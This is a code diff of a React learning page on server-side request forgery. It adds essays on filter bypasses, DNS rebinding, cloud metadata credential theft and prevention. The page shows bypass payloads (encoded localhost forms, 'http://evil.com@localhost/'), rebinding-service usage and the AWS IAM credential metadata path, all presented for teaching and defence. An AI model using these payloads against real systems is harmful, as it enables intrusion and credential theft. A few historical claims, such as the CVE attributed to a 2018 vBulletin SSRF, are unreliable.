+          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Common Vulnerable Parameters</Typography>
           <Grid container spacing={1} sx={{ mb: 3 }}>
             {["url", "uri", "path", "dest", "redirect", "link", "src", "source", "file", "document", "page", "callback", "return", "next", "data", "reference", "site", "html", "val", "validate", "domain", "window", "dir", "show", "navigation", "open", "img", "image", "load", "resource", "feed", "host", "port", "to", "out", "view", "content", "target"].map((param) => (
               <Grid item key={param}>
@@ -1230,19 +1540,90 @@ url=https://YOUR-NGROK-URL.ngrok.io/ssrf-test
 # 4. Monitor server logs for incoming connections`}</CodeBlock>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 2: Exploitation */}
-        <TabPanel value={tabValue} index={2}>
-          <Typography variant="h5" gutterBottom>SSRF Exploitation</Typography>
+      {/* Section: Exploitation */}
+      <Box id="exploitation" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#dc2626", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <WarningIcon sx={{ color: "#dc2626" }} />
+            SSRF Exploitation
+          </Typography>
 
-          <Alert severity="warning" sx={{ mb: 3 }}>
-            <AlertTitle>Authorization Required</AlertTitle>
-            Only test SSRF on systems you have explicit permission to test.
+          <Alert severity="warning" sx={{ mb: 3, bgcolor: alpha("#f59e0b", 0.1), border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
+            <AlertTitle sx={{ color: "#e0e0e0" }}>Authorization Required</AlertTitle>
+            <Typography sx={{ color: "grey.300" }}>
+              Only test SSRF on systems you have explicit permission to test.
+            </Typography>
           </Alert>
 
-          <Typography variant="h6" gutterBottom>Filter Bypass Techniques</Typography>
-          <TableContainer component={Paper} sx={{ mb: 3 }}>
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
+              Breaking Through SSRF Protections: The Cat and Mouse Game
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Most modern applications implement some form of SSRF protection, but these filters are notoriously difficult to build correctly. The fundamental
+              problem is that URLs are complex: they support multiple encoding schemes, have ambiguous parsing rules across libraries, and can be represented
+              in countless equivalent forms. A naive blacklist might block "127.0.0.1" and "localhost", but what about <strong>0.0.0.0</strong> (which many
+              systems treat as localhost)? What about <strong>[::1]</strong> (IPv6 localhost)? What about <strong>2130706433</strong> (decimal representation
+              of 127.0.0.1)? What about <strong>0x7f000001</strong> (hexadecimal)? These are all valid ways to reference localhost, and URL parsers handle
+              them differently across languages and libraries.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Even when filters attempt to be comprehensive, they often fall victim to <strong>parser differentials</strong>—the same URL is interpreted
+              differently by the validation code versus the code that makes the actual request. Consider this URL:{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://evil.com@localhost/</code>. Is "localhost"
+              the hostname or the username? Different parsers disagree. Python's urlparse sees "localhost" as the host, but curl sees it as a username with
+              "evil.com" as the host. An attacker can exploit this: submit a URL that passes validation but is interpreted maliciously when executed. This
+              exact technique was used in the <strong>2018 vBulletin SSRF</strong> (CVE-2019-16759) to bypass host whitelisting and access internal services.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              URL encoding provides another bypass vector. A filter might block "http://localhost/" but miss{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://localh%6fst/</code> (encoding the 'o' in
+              localhost). Double URL encoding can bypass filters that decode once:{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://localh%256fst/</code> (where %25 = '%').
+              Unicode encoding offers even more creative bypasses:{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/</code> uses Unicode circled
+              letters that some parsers normalize to ASCII. The sheer number of encoding variations makes comprehensive blacklisting nearly impossible.
+            </Typography>
+          </Paper>
+
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
+              DNS Rebinding: When Time is the Weapon
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              DNS rebinding is an advanced SSRF technique that exploits the time-of-check-time-of-use (TOCTOU) race condition in URL validation. Here's how
+              it works: The application validates your URL by resolving the hostname to an IP address and checking if it's an internal IP. If it resolves to
+              a safe external IP, validation passes. But then, <strong>before the actual HTTP request is made</strong>, you change the DNS record to point
+              to an internal IP like 127.0.0.1 or 169.254.169.254. The application makes the request using the cached hostname, but DNS resolves it to the
+              malicious internal IP, bypassing all protections.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              This attack requires controlling a domain with a very low TTL (Time To Live), often 0 seconds. Services like <strong>rbndr.us</strong> and{" "}
+              <strong>1u.ms</strong> provide DNS rebinding services specifically for security testing. You create a domain like{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>A.B.C.D.1u.ms</code> where A.B.C.D is the internal
+              IP you want to target. The first DNS query returns a safe IP, but subsequent queries return the encoded internal IP. This bypasses even
+              sophisticated SSRF filters that check IPs at validation time.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              DNS rebinding was famously used in the <strong>2020 Travis CI SSRF vulnerability</strong>, which allowed attackers to access internal
+              infrastructure and pivot to cloud metadata services. The attack is particularly effective against cloud environments where metadata services
+              at 169.254.169.254 contain IAM credentials. Defenses include: <strong>pinning DNS results</strong> at validation time and reusing them for
+              the request, setting minimum TTL values to prevent instant rebinding, and implementing allowlists rather than blocklists for allowed destinations.
+            </Typography>
+          </Paper>
+
+          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Filter Bypass Techniques</Typography>
+          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#dc2626", 0.05), border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
             <Table>
               <TableHead>
                 <TableRow sx={{ bgcolor: "action.hover" }}>
@@ -1424,20 +1805,90 @@ http://bit.ly/xxx → http://internal-system/
 # curl: curl -L --max-redirs 0`}</CodeBlock>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 3: Cloud Attacks */}
-        <TabPanel value={tabValue} index={3}>
-          <Typography variant="h5" gutterBottom>Cloud Metadata Attacks</Typography>
+      {/* Section: Cloud Attacks */}
+      <Box id="cloud-attacks" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <StorageIcon sx={{ color: "#8b5cf6" }} />
+            Cloud Metadata Attacks
+          </Typography>
 
-          <Alert severity="error" sx={{ mb: 3 }}>
-            <AlertTitle>Critical Risk</AlertTitle>
-            Cloud metadata SSRF can lead to complete infrastructure compromise. The 2019 Capital One breach 
-            exposed 100+ million records through AWS metadata SSRF.
+          <Alert severity="error" sx={{ mb: 3, bgcolor: alpha("#ef4444", 0.1), border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
+            <AlertTitle sx={{ color: "#e0e0e0" }}>Critical Risk</AlertTitle>
+            <Typography sx={{ color: "grey.300" }}>
+              Cloud metadata SSRF can lead to complete infrastructure compromise. The 2019 Capital One breach
+              exposed 100+ million records through AWS metadata SSRF.
+            </Typography>
           </Alert>
 
-          <Typography variant="h6" gutterBottom>Cloud Provider Metadata Endpoints</Typography>
-          <TableContainer component={Paper} sx={{ mb: 3 }}>
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
+              The 169.254.169.254 Goldmine: Why Cloud Metadata is the Ultimate SSRF Target
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Every major cloud provider (AWS, GCP, Azure, DigitalOcean, Alibaba Cloud) exposes a metadata service at the link-local address{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>169.254.169.254</code>. This IP address is
+              non-routable—it only works from within the cloud instance itself. The metadata service provides critical information about the running
+              instance: hostname, IP addresses, security groups, user data, and most critically, <strong>IAM credentials</strong>. These credentials grant
+              the instance's role permissions, which often include access to S3 buckets, databases, secrets managers, and other cloud resources.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The Capital One breach of 2019 is the canonical example of cloud metadata SSRF exploitation. A misconfigured web application firewall (WAF)
+              allowed an attacker to perform SSRF against the AWS metadata service. By accessing{" "}
+              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>,
+              the attacker retrieved temporary IAM credentials with overly permissive S3 access. These credentials were then used to exfiltrate over
+              <strong> 100 million customer records</strong>, credit card applications, and Social Security numbers. Capital One was fined $80 million
+              by regulators, and the breach resulted in a $190 million class-action settlement. All because of a single SSRF vulnerability combined with
+              overprivileged IAM roles.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              What makes cloud metadata SSRF so devastating is the <strong>automatic escalation</strong> from web application compromise to full infrastructure
+              access. No additional credentials are needed—the metadata service provides them automatically. In multi-tenant environments, this can lead to
+              lateral movement between customer accounts. Even if the compromised instance has limited direct access, the stolen IAM credentials can often
+              be used to enumerate other resources, read secrets from parameter stores, or access internal APIs. Bug bounty programs regularly pay $10,000+
+              for metadata SSRF vulnerabilities, recognizing their critical severity.
+            </Typography>
+          </Paper>
+
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
+              IMDSv2 and the Arms Race of Metadata Protection
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              After the Capital One breach, AWS introduced <strong>Instance Metadata Service Version 2 (IMDSv2)</strong> as a defense against SSRF attacks.
+              IMDSv2 requires a two-step process: first, make a PUT request to obtain a session token, then use that token in subsequent metadata requests
+              via a custom HTTP header. This makes SSRF exploitation significantly harder because most vulnerable applications only support GET requests
+              and don't allow header injection. The PUT requirement alone blocks the vast majority of SSRF vulnerabilities.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              However, IMDSv2 is not a silver bullet. First, it's not enforced by default—many organizations still run with IMDSv1 enabled for backward
+              compatibility. Second, some applications <em>do</em> allow arbitrary HTTP methods and headers. If a developer exposed a full HTTP proxy or
+              used a library like Python's{" "}
+              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>requests</code> with full parameter control,
+              an attacker could craft the required PUT request with headers to bypass IMDSv2 protection. Third, IMDSv2 doesn't protect against{" "}
+              <strong>container escape</strong> scenarios—if an attacker escapes a container, they're already on the host and can access IMDSv2 directly.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              GCP and Azure implement similar protections. GCP requires a <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>
+              Metadata-Flavor: Google</code> header on all metadata requests. Azure's Instance Metadata Service (IMDS) requires headers and specific API
+              versions. Yet vulnerabilities persist. In 2021, researchers found SSRF bypasses in Azure's own services, and in 2022, a GCP vulnerability
+              allowed accessing metadata without headers via an older API version. The lesson: cloud metadata services remain high-value targets, and
+              defense in depth—network segmentation, least privilege IAM, and disabling metadata access when not needed—is essential.
+            </Typography>
+          </Paper>
+
+          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Cloud Provider Metadata Endpoints</Typography>
+          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
             <Table>
               <TableHead>
                 <TableRow sx={{ bgcolor: "action.hover" }}>
@@ -1601,33 +2052,113 @@ https://NODE-IP:10255/pods
 http://etcd:2379/v2/keys/`}</CodeBlock>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 4: Prevention */}
-        <TabPanel value={tabValue} index={4}>
-          <Typography variant="h5" gutterBottom>Preventing SSRF</Typography>
+      {/* Section: Prevention */}
+      <Box id="prevention" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#22c55e", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <ShieldIcon sx={{ color: "#22c55e" }} />
+            Preventing SSRF
+          </Typography>
 
-          <Alert severity="success" sx={{ mb: 3 }}>
-            Defense in depth is key - combine multiple layers of protection.
+          <Alert severity="success" sx={{ mb: 3, bgcolor: alpha("#22c55e", 0.1), border: `1px solid ${alpha("#22c55e", 0.3)}` }}>
+            <Typography sx={{ color: "grey.300" }}>
+              Defense in depth is key - combine multiple layers of protection.
+            </Typography>
           </Alert>
 
-          <Typography variant="h6" gutterBottom>Prevention Methods</Typography>
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
+              Why SSRF Prevention is So Difficult: The Allowlist Paradox
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Security advice for SSRF prevention universally recommends <strong>allowlisting</strong>—only permit requests to a specific list of known-safe
+              domains. This sounds simple in theory but breaks down in practice for many legitimate use cases. Consider a webhook feature where customers
+              need to specify their own callback URLs, or a PDF generator that fetches user-provided images, or a social media platform that unfurls links
+              from any domain. You <em>can't</em> maintain an allowlist because you don't know ahead of time which domains users will need to access. The
+              entire point of these features is flexibility.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              This is why SSRF protection requires <strong>defense in depth</strong> rather than a single silver bullet. If you can't use an allowlist, you
+              must combine multiple other controls: <strong>(1)</strong> Validate the resolved IP address, not just the hostname—after DNS resolution, check
+              if the IP is in private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8) or cloud metadata ranges (169.254.0.0/16).{" "}
+              <strong>(2)</strong> Disable unnecessary protocols—only allow HTTP/HTTPS, never file://, gopher://, dict://, or others. <strong>(3)</strong>{" "}
+              Disable or validate redirects—attackers use open redirects to bypass hostname validation. <strong>(4)</strong> Use network segmentation—even
+              if SSRF occurs, the compromised server shouldn't be able to reach critical internal services. <strong>(5)</strong> Apply least privilege—limit
+              the IAM role permissions of the instance so stolen credentials have minimal impact.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              The key insight is that <strong>perfect prevention at the application layer is often impossible</strong>, so you must design your infrastructure
+              to contain the damage when SSRF occurs. This is the "assume breach" mentality: cloud metadata services should require authentication (IMDSv2),
+              internal services should require valid credentials, and network policies should prevent lateral movement. Shopify's approach is exemplary: they
+              run a dedicated "fetch service" that handles all outbound requests, applies consistent validation, monitors for abuse, and runs in a heavily
+              restricted network segment that can't reach production databases or metadata services.
+            </Typography>
+          </Paper>
+
+          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
+              Real-World Defense Strategies: Learning from Breaches
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              After the Capital One breach, AWS introduced several defenses that every cloud user should implement. <strong>IMDSv2 (Instance Metadata Service
+              Version 2)</strong> requires a session token obtained via PUT request, making exploitation significantly harder. But it's not enabled by default—you
+              must explicitly configure it. AWS also added <strong>hop limits</strong> for metadata requests, preventing containers or Fargate tasks from
+              accessing the metadata service unless explicitly allowed. These settings should be enforced organization-wide via Service Control Policies (SCPs)
+              or CloudFormation templates.
+            </Typography>
+            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Network-level defenses are equally critical. Use <strong>iptables rules</strong> or security groups to block outbound access to 169.254.169.254
+              from application processes. In Kubernetes, use <strong>Network Policies</strong> to prevent pods from reaching the metadata endpoint. For
+              egress traffic, use a <strong>proxy server</strong> (like Squid) that logs all outbound requests and applies centralized filtering. This provides
+              visibility into SSRF attempts and can block suspicious destinations. Many enterprises use cloud <strong>NAT gateways</strong> with strict
+              egress rules—if a server doesn't need to make outbound requests at all, block all egress entirely.
+            </Typography>
+            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
+              Finally, <strong>monitoring and incident response</strong> are essential. Log all outbound HTTP requests with full URLs and response codes.
+              Alert on requests to private IP ranges or metadata endpoints. Monitor IAM credential usage—if an EC2 instance's credentials are suddenly
+              used from an unexpected region or to access unusual services, it may indicate credential theft via SSRF. Shopify's security team runs honeypot
+              metadata services internally—fake endpoints at 169.254.169.254 that log access and trigger security alerts. This "canary" approach helps
+              detect SSRF vulnerabilities before they're exploited in production.
+            </Typography>
+          </Paper>
+
+          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Prevention Methods</Typography>
           <Grid container spacing={2} sx={{ mb: 3 }}>
             {preventionMethods.map((item) => (
               <Grid item xs={12} sm={6} md={3} key={item.method}>
-                <Card variant="outlined" sx={{ height: "100%" }}>
+                <Card
+                  sx={{
+                    height: "100%",
+                    bgcolor: alpha(item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6", 0.1),
+                    border: `1px solid ${alpha(item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6", 0.3)}`,
+                    borderRadius: 2,
+                  }}
+                >
                   <CardContent>
                     <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
-                      <Typography variant="subtitle1" fontWeight="bold" color="primary">
+                      <Typography variant="subtitle1" fontWeight="bold" sx={{ color: "#e0e0e0" }}>
                         {item.method}
                       </Typography>
                       <Chip 
                         label={item.priority} 
                         size="small" 
-                        color={item.priority === "Critical" ? "error" : item.priority === "High" ? "warning" : "info"}
+                        sx={{
+                          bgcolor: item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6",
+                          color: "white",
+                        }}
                       />
                     </Box>
-                    <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
+                    <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                   </CardContent>
                 </Card>
               </Grid>
@@ -1769,22 +2300,41 @@ iptables -A OUTPUT -d 169.254.169.254 -j DROP`}</CodeBlock>
               </List>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 5: Tools */}
-        <TabPanel value={tabValue} index={5}>
-          <Typography variant="h5" gutterBottom>SSRF Testing Tools</Typography>
+      {/* Section: Tools */}
+      <Box id="tools" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#06b6d4", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <BuildIcon sx={{ color: "#06b6d4" }} />
+            SSRF Testing Tools
+          </Typography>
 
           <Grid container spacing={2} sx={{ mb: 3 }}>
             {ssrfTools.map((tool) => (
               <Grid item xs={12} sm={6} md={4} key={tool.name}>
-                <Card variant="outlined" sx={{ height: "100%" }}>
+                <Card
+                  sx={{
+                    height: "100%",
+                    bgcolor: alpha("#06b6d4", 0.08),
+                    border: `1px solid ${alpha("#06b6d4", 0.2)}`,
+                    borderRadius: 2,
+                  }}
+                >
                   <CardContent>
                     <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
-                      <Typography variant="h6" fontWeight="bold">{tool.name}</Typography>
-                      <Chip label={tool.type} size="small" color="primary" variant="outlined" />
+                      <Typography variant="h6" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{tool.name}</Typography>
+                      <Chip label={tool.type} size="small" sx={{ bgcolor: alpha("#06b6d4", 0.2), color: "#06b6d4" }} />
                     </Box>
-                    <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
+                    <Typography variant="body2" sx={{ color: "grey.400" }}>{tool.desc}</Typography>
                   </CardContent>
                 </Card>
               </Grid>
@@ -1925,14 +2475,28 @@ localhost
 metadata.google.internal`}</CodeBlock>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
+        </Paper>
+      </Box>
 
-        {/* Tab 6: Code Examples */}
-        <TabPanel value={tabValue} index={6}>
-          <Typography variant="h5" gutterBottom>Code Examples</Typography>
+      {/* Section: Code Examples */}
+      <Box id="code-examples" sx={{ mb: 4, scrollMarginTop: "80px" }}>
+        <Paper
+          sx={{
+            p: 4,
+            borderRadius: 3,
+            bgcolor: "#0f1024",
+            border: `1px solid ${alpha("#ec4899", 0.3)}`,
+          }}
+        >
+          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+            <CodeIcon sx={{ color: "#ec4899" }} />
+            Code Examples
+          </Typography>
 
-          <Alert severity="info" sx={{ mb: 3 }}>
-            Compare vulnerable implementations with their secure counterparts across multiple languages.
+          <Alert severity="info" sx={{ mb: 3, bgcolor: alpha("#3b82f6", 0.1), border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
+            <Typography sx={{ color: "grey.300" }}>
+              Compare vulnerable implementations with their secure counterparts across multiple languages.
+            </Typography>
           </Alert>
 
           <Accordion defaultExpanded>
@@ -2358,11 +2922,11 @@ func safeFetch(urlStr string) (string, error) {
 }`}</CodeBlock>
             </AccordionDetails>
           </Accordion>
-        </TabPanel>
-      </Paper>
+        </Paper>
+      </Box>
 
       {/* Quiz Section */}
-      <Box id="quiz" sx={{ mt: 5 }}>
+      <Box id="quiz" sx={{ mb: 4, scrollMarginTop: "80px" }}>
         <QuizSection
           questions={quizPool}
           accentColor={ACCENT_COLOR}
@@ -2372,18 +2936,129 @@ func safeFetch(urlStr string) (string, error) {
         />
       </Box>
 
+      {/* Related Learning Pages */}
+      <Paper
+        sx={{
+          p: 4,
+          mb: 4,
+          borderRadius: 3,
+          bgcolor: "#0f1024",
+          border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
+        }}
+      >
+        <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
+          <SchoolIcon sx={{ color: ACCENT_COLOR }} />
+          Related Learning Pages
+        </Typography>
+        <Grid container spacing={2}>
+          {[
+            { title: "Web App Pentesting Guide", desc: "Comprehensive methodology for security assessments", link: "/learn/pentesting-guide", color: "#ef4444" },
+            { title: "XXE Injection", desc: "XML External Entity attacks and prevention", link: "/learn/xxe", color: "#f59e0b" },
+            { title: "Cloud Security", desc: "AWS, GCP, and Azure security best practices", link: "/learn/cloud-security", color: "#22c55e" },
+          ].map((item) => (
+            <Grid item xs={12} sm={4} key={item.title}>
+              <Card
+                component={Link}
+                to={item.link}
+                sx={{
+                  height: "100%",
+                  bgcolor: alpha(item.color, 0.1),
+                  border: `1px solid ${alpha(item.color, 0.3)}`,
+                  borderRadius: 2,
+                  textDecoration: "none",
+                  transition: "transform 0.2s, box-shadow 0.2s",
+                  "&:hover": {
+                    transform: "translateY(-2px)",
+                    boxShadow: `0 4px 12px ${alpha(item.color, 0.3)}`,
+                  },
+                }}
+              >
+                <CardContent>
+                  <Typography variant="subtitle1" fontWeight="bold" sx={{ color: item.color, mb: 1 }}>
+                    {item.title}
+                  </Typography>
+                  <Typography variant="body2" sx={{ color: "grey.400" }}>
+                    {item.desc}
+                  </Typography>
+                </CardContent>
+              </Card>
+            </Grid>
+          ))}
+        </Grid>
+      </Paper>
+
       {/* Bottom Navigation */}
       <Box sx={{ mt: 4, textAlign: "center" }}>
         <Button
           variant="outlined"
           startIcon={<ArrowBackIcon />}
           onClick={() => navigate("/learn")}
-          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
+          sx={{ borderColor: ACCENT_COLOR, color: ACCENT_COLOR }}
         >
           Back to Learning Hub
         </Button>
       </Box>
-    </Container>
+          </Grid>
+        </Grid>
+      </Container>
+    </Box>
+
+    {/* Mobile Drawer */}
+    <Drawer
+      anchor="left"
+      open={navDrawerOpen}
+      onClose={() => setNavDrawerOpen(false)}
+      sx={{
+        display: { xs: "block", md: "none" },
+        "& .MuiDrawer-paper": { width: 280, bgcolor: "#12121a" },
+      }}
+    >
+      <Box sx={{ p: 2 }}>
+        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
+          <Typography variant="h6" sx={{ color: ACCENT_COLOR, fontWeight: 700 }}>
+            SSRF Guide
+          </Typography>
+          <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
+            <CloseIcon />
+          </IconButton>
+        </Box>
+        {sidebarNav}
+      </Box>
+    </Drawer>
+
+    {/* Mobile FABs */}
+    {isMobile && (
+      <>
+        <Fab
+          size="small"
+          onClick={() => setNavDrawerOpen(true)}
+          sx={{
+            position: "fixed",
+            bottom: 80,
+            right: 16,
+            bgcolor: ACCENT_COLOR,
+            color: "white",
+            "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.8) },
+          }}
+        >
+          <ListAltIcon />
+        </Fab>
+        <Fab
+          size="small"
+          onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
+          sx={{
+            position: "fixed",
+            bottom: 16,
+            right: 16,
+            bgcolor: alpha(ACCENT_COLOR, 0.8),
+            color: "white",
+            "&:hover": { bgcolor: ACCENT_COLOR },
+          }}
+        >
+          <KeyboardArrowUpIcon />
+        </Fab>
+      </>
+    )}
     </LearnPageLayout>
   );
 };
